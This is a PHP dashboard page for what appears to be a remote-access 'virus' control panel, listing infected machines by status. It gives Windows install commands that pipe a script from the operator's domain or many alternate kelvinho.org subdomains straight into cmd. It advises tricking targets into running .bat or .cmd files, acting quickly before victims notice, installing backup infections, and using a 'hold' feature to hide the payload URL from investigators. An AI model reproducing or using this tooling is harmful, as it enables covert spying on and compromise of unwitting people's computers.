<?php /** @noinspection PhpUnusedParameterInspection */

use Kelvinho\Virus\Singleton\Header;
use Kelvinho\Virus\Singleton\HtmlTemplate;
use Kelvinho\Virus\Singleton\Timezone;
use Kelvinho\Virus\Virus\Virus;
use function Kelvinho\Virus\formattedHash;
use function Kelvinho\Virus\formattedTime;
use function Kelvinho\Virus\formattedTimeSpan;
use function Kelvinho\Virus\map;

/**
 * @param array $datas Array of {"virus_id" -> "{virus_id}", "last_ping" -> "{last ping}", "style" -> "{tr style}", "displays" -> {"Name" -> "{name}", "Virus id" -> "{virus_id}", "Last seen" -> "{last_seen}"}}
 * @noinspection PhpUnusedParameterInspection
 */
function displayTable(array $datas) {
    if (count($datas) === 0) { ?>
        <p>(No viruses)</p>
    <?php } else { ?>
        <div style="overflow: auto;">
            <table>
                <tr>
                    <?php map($datas[0]["displays"], function ($value, $label) {
                        echo "<th>$label</th>";
                    }); ?>
                </tr>
                <?php
                map($datas, function ($datas, $virus_id) { ?>
                    <tr style="cursor: pointer;<?php echo $datas["style"]; ?>">
                        <?php map($datas["displays"], function ($value, $label) {
                            echo "<td>$value</td>";
                        }); ?>
                    </tr>
                <?php }); ?>
            </table>
        </div>
    <?php }
}

function newDisplayTable() {
}

if (!$authenticator->authenticated()) {
    header("Location: " . DOMAIN_LOGIN);
    Header::redirect();
}

$user_handle = $session->get("user_handle");
$user = $userFactory->get($user_handle);
$alternates = ["math", "nuclear", "graph", "cloud", "mail", "computer", "car", "rocket", "trump", "obama", "food"];
?>
<html lang="en_US">
<head>
    <title>Dashboard</title>
    <?php echo HtmlTemplate::header(); ?>
    <style>
        .codes {
            color: midnightblue;
        }

        table {
            border: none;
            border-collapse: collapse;
            padding: 0;
            margin: 0;
        }

        .hold {
            color: blue;
            cursor: pointer;
        }
    </style>
</head>
<body>
<h2>Active viruses</h2>
<p>These are viruses that are still reporting back pretty quickly (less
    than <?php echo formattedTimeSpan(10 * VIRUS_PING_INTERVAL); ?>)</p>
<?php displayTable(map($user->getViruses(Virus::VIRUS_ACTIVE), function ($data, $key, $timezone) use ($virusFactory) {
    $virus = $virusFactory->get($data["virus_id"]);
    $onclick = "onclick = \"virusInfo('" . $virus->getVirusId() . "')\"";
    return array("virus_id" => $virus->getVirusId(), "last_ping" => $virus->getLastPing(), "style" => ($virus->isStandalone() ? "" : "background: lightgrey;"), "displays" => array("Name" => "<a $onclick>" . $virus->getName() . "</a>",
        "Virus id" => "<a $onclick>" . formattedHash($virus->getVirusId()) . "</a>",
        "Last seen" => "<a $onclick>" . formattedTime($virus->getLastPing() + Timezone::getUnixOffset($timezone)) . " UTC $timezone</a>",
        "" => "<a onclick = 'deleteVirus(\"" . $virus->getVirusId() . "\")'>Delete</a>"));
}, $user->getTimezone())); ?>
<h2>Dormant viruses</h2>
<p>These are viruses that don't report back, but most likely due to the target's computer being shut off for less
    than 2 days</p>
<?php displayTable(map($user->getViruses(Virus::VIRUS_DORMANT), function ($data, $key, $timezone) use ($virusFactory) {
    $virus = $virusFactory->get($data["virus_id"]);
    $onclick = "onclick = \"virusInfo('" . $virus->getVirusId() . "')\"";
    return array("virus_id" => $virus->getVirusId(), "last_ping" => $virus->getLastPing(), "style" => ($virus->isStandalone() ? "" : "background: lightgrey;"), "displays" => array("Name" => "<a $onclick>" . $virus->getName() . "</a>",
        "Virus id" => "<a $onclick>" . formattedHash($virus->getVirusId()) . "</a>",
        "Last seen" => "<a $onclick>" . formattedTime($virus->getLastPing() + Timezone::getUnixOffset($timezone)) . " UTC $timezone</a>",
        "" => "<a onclick = 'deleteVirus(\"" . $virus->getVirusId() . "\")'>Delete</a>"));
}, $user->getTimezone())); ?>
<h2>Lost viruses</h2>
<p>These are viruses that don't report back for more than 2 days</p>
<?php displayTable(map($user->getViruses(Virus::VIRUS_LOST), function ($data, $key, $timezone) use ($virusFactory) {
    $virus = $virusFactory->get($data["virus_id"]);
    $onclick = "onclick = \"virusInfo('" . $virus->getVirusId() . "')\"";
    return array("virus_id" => $virus->getVirusId(), "last_ping" => $virus->getLastPing(), "style" => ($virus->isStandalone() ? "" : "background: lightgrey;"), "displays" => array("Name" => "<a $onclick>" . $virus->getName() . "</a>",
        "Virus id" => "<a $onclick>" . formattedHash($virus->getVirusId()) . "</a>",
        "Last seen" => "<a $onclick>" . formattedTime($virus->getLastPing() + Timezone::getUnixOffset($timezone)) . " UTC $timezone</a>",
        "" => "<a onclick = 'deleteVirus(\"" . $virus->getVirusId() . "\")'>Delete</a>"));
}, $user->getTimezone())); ?>
<h2>Expecting viruses</h2>
<p>These are viruses that haven't reported back yet, but are expected to report soon. This is automatically
    triggered by accessing the entry point.</p>
<?php displayTable(map($user->getViruses(Virus::VIRUS_EXPECTING), function ($data) use ($virusFactory) {
    $virus = $virusFactory->get($data["virus_id"]);
    $onclick = "onclick = \"virusInfo('" . $virus->getVirusId() . "')\"";
    return array("virus_id" => $virus->getVirusId(), "last_ping" => $virus->getLastPing(), "style" => ($virus->isStandalone() ? "" : "background: lightgrey;"), "displays" => array("Name" => "<a $onclick>" . $virus->getName() . "</a>",
        "Virus id" => "<a $onclick>" . formattedHash($virus->getVirusId()) . "</a>",
        "" => "<a onclick = 'deleteVirus(\"" . $virus->getVirusId() . "\")'>Delete</a>"));
})); ?>
<h2>Emergency hold</h2>
<p>Normally, you can install the virus using the command below. What it does is it copies installation instructions from
    the URL and executes that. However, if you are trying to convince others to willingly install the virus on their
    computer, they might go to the URL and inspect what's there after they have run it (or before they run it, in which
    case you're out of luck). They may figure out where the virus is located and may get curious and reverse engineer it
    and foil your plans. So, this is a way to hide that URL, and redirect it to google if you choose to hold it.</p>
<?php
if ($user->isHold()) { ?>
    <p><span style="color: red;">You are currently holding, meaning you can't install new viruses</span>. Click <a
                class="hold" onclick="removeHold()">here</a> to
        remove hold.</p>
<?php } else { ?>
    <p>You are currently not holding, meaning you can install new viruses but outsiders can reverse engineer the virus.
        Click <a class="hold" onclick="applyHold()">here</a> to apply a hold.</p>
<?php } ?>
<h2>Installing a new virus</h2>
To install a new virus on a Windows computer, execute this command in the command prompt on the target machine:
<pre class="codes"
     style="overflow: auto;">curl <?php echo ALT_DOMAIN_SHORT; ?>/new/<?php echo $user_handle; ?> | cmd</pre>
And run this for Mac (in development, not available):
<pre class="codes" style="overflow: auto;">curl <?php echo ALT_DOMAIN_SHORT; ?>/new/mac/<?php echo $user_handle; ?> | cmd</pre>
<p>The "|" character, known as the vertical bar, normally sits <!--suppress HtmlUnknownTarget --> <a
            href="/resources/images/normal_vertical_bar.png" target=_blank style="color: blue;">right above the enter
        button</a>. Some keyboards denote it with <!--suppress HtmlUnknownTarget --><a
            href="/resources/images/split_vertical_bar.jpg" target=_blank style="color: blue;">2 vertical bars align
        end-to-end</a></p>
<p>Instantaneously after you have run that command, you should be able to see that virus pops up in the list of
    expecting viruses. After a few seconds, the virus will pings back for the first time, and will jump to the active
    viruses category. If this doesn't happen, then something has gone wrong and I have no idea how to fix it. May be the
    target machine has an antivirus? :D</p>
<p>I recommend you memorize the above command because when you are actually attacking them, you need to do it
    quickly, before they can notice anything. I also recommend installing 1 initial virus on a target machine, then
    install a new one that acts as a backup.</p>
<h3>Alternate: Using a file</h3>
<p>You can put the command above in a file, then name the file so that it has extension .cmd or .bat, which ever you
    prefer, then give your target that file and tell them to run it.</p>
<h3>Alternate: Using your own domain</h3>
<p>Let's say you have your own domain "awesome.app.com". You can then redirect it to the command above (this is hard if
    you don't know what you're doing). Then the command to install will now be:</p>
<pre class="codes"
     style="overflow: auto;">curl -L awesome.app.com | cmd</pre>
<h3>Alternate: Using alternate addresses I created</h3>
<p>You can use any of these alternate addresses, if you don't agree with using <?php echo ALT_DOMAIN_SHORT; ?></p>
<div style="overflow: auto;">
    <?php foreach ($alternates as $alternate) { ?>
        <pre class="codes">curl <?php echo $alternate; ?>.kelvinho.org/new/<?php echo $user_handle; ?> | cmd</pre>
    <?php } ?>
</div>
<p>Same goes for the mac install command.</p>
<p>I can definitely add more, but what's the point? Also, note that <?php echo DOMAIN; ?> is the main site, and is
    accessible encrypted only. Any insecure requests will be redirected to the secure site. However, all of the
    alternative built-in domains are unencrypted just because I'm lazy, and they are meant to install the virus only, so
    what's the point of encryption?</p>
<h3>Alternate: Rebuild this entire application and control your own data</h3>
<p>If you don't agree that I control your spying data then you can rebuild everything here. The project is open sourced
    (under the MIT license) and available <a href="<?php echo GITHUB_PAGE; ?>" style="color: blue">here</a>. The
    installation details are way too technical here, but there're plenty of guide on the github page.</p>
<p>One last bit of advice: test everything locally first, on either your machine or a VM, then actually getting out
    to attack. The chance for attacking is very small, and you wouldn't want to have a chance and it doesn't get
    installed properly do you?</p>
<h2>Deleting a virus</h2>
<p>When you are done with a virus, you can just press delete, and then you will not be able to access it. The app
    will also send a kill signal to the virus itself, to make sure every trace of the virus is gone. There will be
    no oops button, so only delete a virus if you really want to.</p>
</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
<script type="text/javascript" src="https://157239n.com/page/assets/js/main.js"></script>
<!--suppress JSUnusedGlobalSymbols -->
<script type="application/javascript">
    function virusInfo(virus_id) {
        $.ajax({
            url: "<?php echo DOMAIN_CONTROLLER; ?>/setVirusId",
            type: "POST",
            data: {
                virus_id: virus_id
            },
            success: function () {
                window.location = "<?php echo DOMAIN_VIRUS_INFO; ?>";
            }
        });
    }

    function deleteVirus(virus_id) {
        $.ajax({
            url: "<?php echo DOMAIN_CONTROLLER; ?>/deleteVirus",
            type: "POST",
            data: {
                virus_id: virus_id
            },
            success: function () {
                window.location = "<?php echo DOMAIN; ?>";
            }
        });
    }

    function removeHold() {
        $.ajax({
            url: "<?php echo DOMAIN_CONTROLLER; ?>/removeHold",
            type: "POST",
            success: function () {
                window.location = "<?php echo DOMAIN_DASHBOARD; ?>";
            }
        });
    }

    function applyHold() {
        $.ajax({
            url: "<?php echo DOMAIN_CONTROLLER; ?>/applyHold",
            type: "POST",
            success: function () {
                window.location = "<?php echo DOMAIN_DASHBOARD; ?>";
            }
        });
    }

    //document.body.requestFullscreen();
    window.scrollTo(0,1);
</script>
</html>
